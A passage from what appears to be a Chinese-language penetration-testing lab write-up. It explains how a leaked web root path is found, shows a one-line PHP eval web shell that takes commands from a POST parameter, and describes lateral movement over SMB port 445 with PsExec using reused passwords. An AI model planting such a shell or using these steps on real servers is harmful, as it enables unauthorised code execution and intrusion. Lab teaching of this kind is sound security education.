...
>[!TIP]
>
>这里建议全屏打开 kali，同时适当缩小并上移窗口，初始化选择文件夹的那个窗口有概率会很大，可能会看不到底下的选择键。（当时本蒟蒻还以为哪里出错了）
...
从这个页面中我们能清晰地知道关于这个 web 服务的一系列环境信息。尤其是 “ 绝对路径：```C:/phpStudy/WWW``` ” 暴露了这个网站的根目录，对于后续操作服务器中文件，具有重要作用（毕竟如果不知道绝对路径，就像徒有专业的撬锁工具却找不到需要撬的门）。
...
>```
>
>我们需要注意，这个文件保存在哪? ```C:\phpStudy\WWW``` 这是网站的对外根目录，外部用户也能访问它。更要命的是：它的是一个后缀为 .php 的文件。因此，它会被 Web 服务器交给 PHP 解析器处理。
>
>```php
><?php @eval($_POST["888"]);?>
>```
...
><details>
><summary>
>445 端口是干啥的？我们能利用它做什么？在本次实验中，我们该怎么利用它？
></summary>
>
>$\;$
>
...
>
>但是，作为我们接触的第一个靶场，我们暂时无需接触那么复杂的攻击方式。企业内，为方便管理常常会出现密码复用的情况。
>
>本次靶场攻防，我们就利用这一点进行横向移动：我们获取的密码直接对 OWA 和 ROOT 有效，我们可以直接利用 445/SMB + PsExec 实现远程执行上线，从而完成横向移动。
>
></details>
